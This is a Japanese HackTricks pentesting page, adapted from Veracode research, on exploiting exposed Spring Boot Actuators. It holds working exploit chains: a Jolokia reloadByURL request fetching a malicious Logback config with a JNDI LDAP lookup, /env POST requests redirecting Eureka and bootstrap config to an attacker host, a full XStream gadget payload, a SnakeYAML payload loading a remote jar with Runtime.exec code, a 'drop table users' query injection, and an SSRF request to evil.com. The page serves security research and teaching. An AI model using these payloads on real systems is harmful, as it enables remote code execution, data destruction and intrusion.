# Spring Actuators

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**、または**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>

## **Spring認証バイパス**

<figure><img src="../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

**出典:** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## Spring Boot Actuatorsの悪用

**引用元:** [**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

Spring Bootフレームワークには、本番環境にアプリケーションをデプロイした際に監視と管理を支援するための機能であるアクチュエータがいくつか含まれています。監査、健康状態、メトリクス収集のために使用されることを意図していますが、誤設定された場合にはサーバーへの隠された扉を開く可能性があります。

Spring Bootアプリケーションが実行されているとき、自動的にいくつかのエンドポイント（'/health'、'/trace'、'/beans'、'/env'など）がルーティングプロセスに登録されます。Spring Boot 1 - 1.4では、これらは認証なしでアクセス可能であり、セキュリティに重大な問題を引き起こします。Springバージョン1.5以降では、'/health'と'/info'を除くすべてのエンドポイントがセンシティブと見なされ、デフォルトで保護されていますが、このセキュリティはしばしばアプリケーション開発者によって無効にされます。

以下のアクチュエータエンドポイントは、セキュリティ上の問題を引き起こし、潜在的な脆弱性につながる可能性があります：

* /dump - スレッドのダンプを表示します（スタックトレースを含む）
* /trace - 最後のいくつかのHTTPメッセージを表示します（セッション識別子を含む可能性があります）
* /logfile - ログファイルの内容を出力します
* /shutdown - アプリケーションをシャットダウンします
* /mappings - すべてのMVCコントローラーマッピングを表示します
* /env - 設定環境にアクセスを提供します
* /actuator/env
* /restart - アプリケーションを再起動します
* /heapdump - アプリケーションで使用されているJVMからヒープダンプを作成して返します

Spring 1xでは、これらはルートURLの下に登録されており、2xでは"/actuator/"ベースパスに移動しました。

**悪用方法:**

ほとんどのアクチュエータはGETリクエストのみをサポートし、機密性の高い設定データを単に明らかにするだけですが、いくつかは特にシェルハンターにとって興味深いものです：

**1. '/jolokia'を介したリモートコード実行**

ターゲットアプリケーションのクラスパスにJolokiaライブラリが含まれている場合、それは自動的にSpring Bootによって'/jolokia'アクチュエータエンドポイントの下で公開されます。Jolokiaは、登録されているすべてのMBeansにHTTPアクセスを許可し、JMXで実行できるのと同じ操作を実行するように設計されています。URLを使用して利用可能なすべてのMBeansアクションをリストすることができます：

[**http://127.0.0.1:8090/jolokia/list**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

再び、ほとんどのMBeansアクションは単にシステムデータの一部を明らかにするだけですが、1つは特に興味深いものです：

![reloadByURL](https://www.veracode.com/sites/default/files/exploiting\_spring\_boot\_actuators\_jolokia.png)

'**reloadByURL**'アクションは、Logbackライブラリによって提供され、外部URLからロギング設定をリロードすることを可能にします。次のURLにナビゲートするだけでトリガーできます：[**http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

では、なぜロギング設定が重要なのでしょうか？主に2つの理由があります：

1. 設定はXML形式であり、もちろんLogbackはそれを外部エンティティが有効な状態で解析します。したがって、それはブラインドXXEに対して脆弱です。
2. Logback設定には['JNDIから変数を取得する'](https://logback.qos.ch/manual/configuration.html#insertFromJNDI)機能があります。XMLファイルには、'**\<insertFromJNDI env-entry-name="java:comp/env/appName" as="appName" />**'のようなタグを含めることができ、name属性はDirContext.lookup()メソッドに渡されます。もし.lookup()関数に任意の名前を供給することができれば、XXEやHeapDumpは必要なく、完全な**リモートコード実行**を実現できます。

**動作原理:**

1\. 攻撃者は、'qos.logback.classic.jmx.JMXConfigurator'クラスによって提供される'reloadByURL'関数を実行するために前述のURLをリクエストします。

2\. 'reloadByURL'関数は、[http://artsploit.com/logback.xml](http://artsploit.com/logback.xml)から新しい設定をダウンロードし、Logback設定として解析します。この悪意のある設定には次の内容が含まれているべきです：
```
<configuration>
<insertFromJNDI env-entry-name="ldap://artsploit.com:1389/jndi" as="appName" />
</configuration>
```
3\. このファイルが脆弱なサーバーで解析されると、「env-entry-name」パラメーター値で指定された攻撃者制御のLDAPサーバーへの接続が作成され、JNDI解決につながります。悪意のあるLDAPサーバーは、ターゲットアプリケーション上で**提供されたバイトコードの実行**をトリガーする'Reference'タイプのオブジェクトを返す可能性があります。JNDI攻撃については、この[MicroFocusの研究論文](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf)でよく説明されています。[新しいJNDIエクスプロイト技術](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)（以前私たちのブログで説明された）もここで機能します。なぜならTomcatはSpring Boot Frameworkのデフォルトのアプリケーションサーバーだからです。

**2. '/env'を通じた設定変更**

Spring Cloudライブラリがクラスパスにある場合、**'/env'** エンドポイントを使用してSpringの環境プロパティを変更できます。'**@ConfigurationProperties**'と注釈されたすべてのビーンは変更され再バインドされる可能性があります。'/configprops'アクチュエーターエンドポイントにリストされているプロパティは多いですが、何を変更すれば何かを達成できるのかは全く明確ではありません。それらをいじって数日を過ごした後、私たちはこれを見つけました：
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
このプロパティは、Eureka serviceURLを任意の値に変更します。Eureka Serverは通常、ディスカバリーサーバーとして使用され、ほぼすべてのSpring Cloudアプリケーションがそれに登録し、状態更新を送信します。ターゲットのクラスパスにEureka-Client <1.8.7が含まれている場合（通常はSpring Cloud Netflixに含まれています）、それに存在する**XStreamデシリアライゼーションの脆弱性**を利用できます。必要なのは、'eureka.client.serviceUrl.defaultZone'プロパティを'/env'経由であなたのサーバーURL（[http://artsploit.com/n/xstream](http://artsploit.com/n/xstream)）に設定し、その後'/refresh'エンドポイントを呼び出すことです。その後、あなたのサーバーは以下の内容を持つXStreamペイロードを提供するべきです：
```markup
<linked-hash-set>
<jdk.nashorn.internal.objects.NativeString>
<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
<dataHandler>
<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
<is class="javax.crypto.CipherInputStream">
<cipher class="javax.crypto.NullCipher">
<serviceIterator class="javax.imageio.spi.FilterIterator">
<iter class="javax.imageio.spi.FilterIterator">
<iter class="java.util.Collections$EmptyIterator"/>
<next class="java.lang.ProcessBuilder">
<command>
<string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>
</command>
<redirectErrorStream>false</redirectErrorStream>
</next>
</iter>
<filter class="javax.imageio.ImageIO$ContainsFilter">
<method>
<class>java.lang.ProcessBuilder</class>
<name>start</name>
<parameter-types/>
</method>
<name>foo</name>
</filter>
<next class="string">foo</next>
</serviceIterator>
<lock/>
</cipher>
<input class="java.lang.ProcessBuilder$NullInputStream"/>
<ibuffer></ibuffer>
</is>
</dataSource>
</dataHandler>
</value>
</jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>
```
```markdown
このXStreamペイロードは、[Marshalsec research](https://github.com/mbechler/marshalsec)からのImageIO JDK-onlyガジェットチェーンをわずかに変更したものです。唯一の違いは、`jdk.nashorn.internal.objects.NativeString.hashCode()`メソッドをトリガーするために**LinkedHashSet**を使用していることです。元のペイロードはjava.lang.Mapを利用して同じ動作を実現していますが、EurekaのXStream設定には[カスタムコンバーター for maps](https://github.com/Netflix/eureka/blob/master/eureka-client/src/main/java/com/netflix/discovery/converters/XmlXStream.java#L58)があり、それを使用することはできません。上記のペイロードはMapsを一切使用せず、追加の制約なしでRemote Code Executionを実現することができます。

Spring Actuatorsを使用すると、内部Eurekaサーバーにアクセスできない場合でも、この脆弱性を利用することができます。"/env"エンドポイントが利用可能であれば十分です。

**その他の有用な設定:**

**spring.datasource.tomcat.validationQuery=drop+table+users** - 任意のSQLクエリを指定でき、現在のデータベースに対して自動的に実行されます。insert、update、deleteなどのステートメントであっても構いません。

![Exploiting Spring Boot Actuators Drop Table](https://www.veracode.com/sites/default/files/exploiting_spring_boot_actuators_drop_table.png)

**spring.datasource.tomcat.url**=jdbc:hsqldb:[https://localhost:3002/xdb](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - 現在のJDBC接続文字列を変更することができます。

最後の設定は素晴らしそうですが、問題はアプリケーションがデータベース接続を既に確立している場合、JDBC文字列を更新しても効果がないことです。幸いなことに、この場合に役立つ別のプロパティがあります:

**spring.datasource.tomcat.max-active**=777

ここで使用できるトリックは、データベースへの同時接続数を増やすことです。したがって、JDBC接続文字列を変更し、接続数を増やした後、アプリケーションに多くのリクエストを送信して重い負荷をシミュレートします。負荷の下で、アプリケーションは更新された悪意のあるJDBC文字列で新しいデータベース接続を作成します。この技術はローカルでMysqlに対してテストし、うまく機能しました。

![Exploiting Spring Boot Actuators Max Active](https://www.veracode.com/sites/default/files/exploiting_spring_boot_actuators_max_active.png)

それ以外にも、興味深いが実際にはあまり役に立たないプロパティがあります:

**spring.datasource.url** - データベース接続文字列（最初の接続にのみ使用）

**spring.datasource.jndiName** - データベースJNDI文字列（最初の接続にのみ使用）

**spring.datasource.tomcat.dataSourceJNDI** - データベースJNDI文字列（全く使用されていない）

**spring.cloud.config.uri**=[http://artsploit.com/](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - spring cloud config url（アプリ開始後には効果がなく、初期値のみが使用されます。）

これらのプロパティは、'/restart'エンドポイントが呼び出されない限り、効果がありません。このエンドポイントはすべてのApplicationContextを再起動しますが、デフォルトでは無効になっています。

他にも多くの興味深いプロパティがありますが、変更後すぐに効果があるものはほとんどありません。

**N.B.** Spring Boot 2xでは、'/env'エンドポイントを介してプロパティを変更するためのリクエストフォーマットが少し異なります（json形式を使用しますが）、アイデアは同じです。

**脆弱なアプリの例:**

この脆弱性をローカルでテストしたい場合は、私のGithubページに[simple Spring Boot application](https://github.com/artsploit/actuator-testbed)を作成しました。データベース設定を除いて、すべてのペイロードがそこで動作するはずです（設定されている場合）。

**ブラックボックス発見:**

デフォルトのアクチュエーターの完全なリストはこちらで見つけることができます: [https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)。アプリケーション開発者は@Endpointアノテーションを使用して独自のエンドポイントを作成することができることに注意してください。

**2019年5月の更新:**

Spring環境プロパティの変更を介してRCEを実現するより信頼性の高い方法があります:
```
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml
```
このリクエストは、外部設定を読み込み、それをYAML形式で解析するために使用される 'spring.cloud.bootstrap.location' プロパティを変更します。これを実現するためには、'/refresh' エンドポイントを呼び出す必要もあります。
```
POST /refresh HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
```markdown
YAML設定がリモートサーバーから取得されると、それはSnakeYAMLライブラリで解析されます。このライブラリも逆シリアル化攻撃に対して脆弱です。ペイロード（yaml-payload.yml）は、前述のMarshalsecの研究を使用して生成されるかもしれません：
```
```
!!javax.script.ScriptEngineManager [
!!java.net.URLClassLoader [[
!!java.net.URL ["http://artsploit.com/yaml-payload.jar"]
]]
]
```
このファイルのデシリアライズは、提供されたURLClassLoaderを使用してScriptEngineManagerのコンストラクタの実行をトリガーします。簡単に言うと、**'java.util.ServiceLoader#load(java.lang.Class\<S>, java.lang.ClassLoader)'** メソッドに至り、クラスパス内のすべてのライブラリで'ScriptEngineFactory'インターフェースのすべての実装を探します。URLClassLoaderを介して新しいライブラリを追加できるため、悪意のあるバイトコードを内蔵した新しい'ScriptEngineFactory'を提供できます。これを行うためには、以下の必須ファイルを含むjarアーカイブを作成する必要があります：[yaml-payload.jar:/artsploit/AwesomeScriptEngineFactory.class](https://github.com/artsploit/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java) は、コンストラクタに悪意のあるペイロードを含む実際のバイトコードを含むべきです。
```
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

public AwesomeScriptEngineFactory() {
try {
Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
} catch (IOException e) {
e.printStackTrace();
}
}
```
```markdown
[yaml-payload.jar:/META-INF/services/javax.script.ScriptEngineFactory](https://github.com/artsploit/yaml-payload/blob/master/src/META-INF/services/javax.script.ScriptEngineFactory)は、ServiceLoaderがクラスを見つける場所を知るために、'artsploit.AwesomeScriptEngineFactory'への完全な参照を含むテキストファイルであるべきです: **artsploit.AwesomeScriptEngineFactory** この攻撃技術はspring cloudがクラスパスにあることを要求しますが、EurekaのXStreamペイロードと比較して、最新バージョンでも機能します。完全なペイロードは私のgithubプロジェクトで見つけることができます: [yaml-payload](https://github.com/artsploit/yaml-payload)。

## Env + H2 RCE

/env + H2の組み合わせを利用する方法については、このページを参照してください: [https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)

## Spring Bootでの不正確なパス名解釈によるSSRF <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

[**この研究から**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation): Springフレームワークは、HTTPパス名の最初のスラッシュの前にマトリックスパラメータセパレータ文字 `;` を受け入れます：
```
```http
GET ;1337/api/v1/me HTTP/1.1
Host: target.com
Connection: close
```
以下のようなシナリオを考えてみましょう：

<figure><img src="../../.gitbook/assets/image (717).png" alt="" width="563"><figcaption></figcaption></figure>

Springではマトリックスパラメータセパレータに続く任意の文字を許可しているため、`@` 文字を使用して任意のエンドポイントを取得することも可能です。

以下にエクスプロイトリクエストの例を示します：
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
## 詳細情報

* [https://tutorialboy24.blogspot.com/2022/02/introduction-to-spring-boot-related.html](https://tutorialboy24.blogspot.com/2022/02/introduction-to-spring-boot-related.html)
* [https://blog.maass.xyz/spring-actuator-security-part-1-stealing-secrets-using-spring-actuators](https://blog.maass.xyz/spring-actuator-security-part-1-stealing-secrets-using-spring-actuators)
* [https://blog.maass.xyz/spring-actuator-security-part-2-finding-actuators-using-static-code-analysis-with-semgrep](https://blog.maass.xyz/spring-actuator-security-part-2-finding-actuators-using-static-code-analysis-with-semgrep)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
